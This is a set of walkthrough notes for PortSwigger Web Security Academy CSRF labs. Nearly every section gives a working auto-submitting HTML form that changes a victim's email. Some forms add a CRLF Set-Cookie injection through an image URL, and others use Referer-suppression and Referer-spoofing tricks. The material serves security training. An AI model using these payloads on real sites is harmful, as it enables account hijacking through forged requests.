# Cross Site Request Forgery (CSRF)

## CSRF vulnerability with no defenses

https://portswigger.net/web-security/csrf/lab-no-defenses

Overall Structure

```
Fake Client with Cookie
           |
           |
           ∨
Exploit Server with malicious code Access  
           |
           |  [Automatically]
           ∨
Main Server Access to rewrite email
```

So the goal is to set the exploit server such that when the client accesses it, email is changed

Set as body of exploit server as this (taking reference from the `/my-account` page), then test & deliver the exploit to the victim

```html
<!-- Exploit code from here ---------------------------- -->
	<p>Your username is: wiener</p>
	<p>Your email is: wiener@normal-user.net</p>
	<form class="login-form" name="change-email-form" action="https://acfb1f8b1febb025c028ce1b005d0057.web-security-academy.net/my-account/change-email" method="POST">
		<label>Email</label>
		<input required="" type="email" name="a" value="">
		<input type="hidden" name="email" value="pwned@evil-user.net" />
		<button class="button" type="submit"> Update email </button>
	</form>
	<script>
		document.forms[0].submit();
	</script>
<!-- Exploit code ends here ---------------------------- -->
```

![](Pasted%20image%2020220514120116.png)

![](Pasted%20image%2020220514120122.png)

## CSRF where token validation depends on request method


![](Pasted%20image%2020220514121536.png)

The request method is POST. so changing it to GET, injecting our custom payload and uploading it on the exploit server should work.

```html
<div id="account-content">
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="https://ac7d1fb01f6f5964c09cb9ca00190095.web-security-academy.net/my-account/change-email" method="GET">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <input required="" type="hidden" name="csrf" value="PebMbRdqcsvMdZQSxtJtRr8VRiNbqjJ8">
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

![](Pasted%20image%2020220514121934.png)


```html
<div id="account-content">
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="https://ac1c1f341f6b83b2c0fe382500b50027.web-security-academy.net/my-account/change-email" method="GET">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <input required="" type="hidden" name="csrf" value="PebMbRdqcsvMdZQSxtJtRr8VRiNbqjJ8">
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

## CSRF where token validation depends on token being present

Just remove the token
```html
<div id="account-content">
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="https://ac1c1f341f6b83b2c0fe382500b50027.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <!--<input required="" type="hidden" name="csrf" value="">-->
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

This should work

  
## CSRF where token is not tied to user session
https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session

Just login, inspect element to get the value of the csrf token (from the csrf input), and put it in the exploit

![](Pasted%20image%2020220514123251.png)

```html
<div id="account-content">
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="https://ac511f561e76d771c08d133900a100ff.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <input required="" type="hidden" name="csrf" value="LHaigSgDqSRPYp4Q0jLhqouUMHEC2Y1Y">
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

## CSRF where token is tied to non-session cookie
https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie

Used the Writeup

Cookies

![](Pasted%20image%2020220514124122.png)

CSRF Token

![](Pasted%20image%2020220514124441.png)

Just need to add code to set the csrfKey cookie
Need to keep looking through the webpages

```html
<img src="https://0a1400b70354a569c1cd589500e50056.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=4AUNHwEKzhn7G8evThlbMJcxgovvdW4Y" onerror="document.forms[0].submit()">

<div id="account-content">
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="https://0a1400b70354a569c1cd589500e50056.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <input required="" type="hidden" name="csrf" value="kKuaPsSSqgbzIsaKzoT0CJrsJ20xyOum">
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

## CSRF where token is duplicated in cookie
https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie

```html
<img src="https://0a57009b03ab3a2dc1d461a400610048.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=AAAABBBBCCCC" onerror="document.forms[0].submit()">

<div id="account-content">
    <form class="login-form" name="change-email-form" action="https://0a57009b03ab3a2dc1d461a400610048.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <input required="" type="hidden" name="csrf" value="AAAABBBBCCCC">
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

## CSRF where Referer validation depends on header being present
https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

```html
<meta name="referrer" content="never">

<img src="https://0a7000900402532ec00dad9b00ab007c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=AAAABBBBCCCC" onerror="document.forms[0].submit()">

<div id="account-content">
    <form class="login-form" name="change-email-form" action="https://0a7000900402532ec00dad9b00ab007c.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input type="hidden" name="email" value="pwned@evil-user.net" />
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```

## CSRF with broken Referer validation
https://portswigger.net/web-security/csrf/lab-referer-validation-broken

Can check [here](https://gist.github.com/hsleonis/0dd421c57eeae61bcd2c0dbe3b887c06) for more on referrer states. But the idea is to send the uri in the referrer

Make the endpoint be `//0a77000f04c15079c0e41fd600040018.web-security-academy.net`

This `/a?0a77000f04c15079c0e41fd600040018.web-security-academy.net/my-account/` works on testing, but looking at the exploit server logs, the server cannot access it (404) due to adding a `/` at the end

```html
<meta name="referrer" content="unsafe-url">
<div id="account-content">
    <form class="login-form"action="https://0a77000f04c15079c0e41fd600040018.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input type="hidden" name="email" value="pwn@evil-user.net" />
        <button class="button" type="submit"> Update email </button>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</div>
```
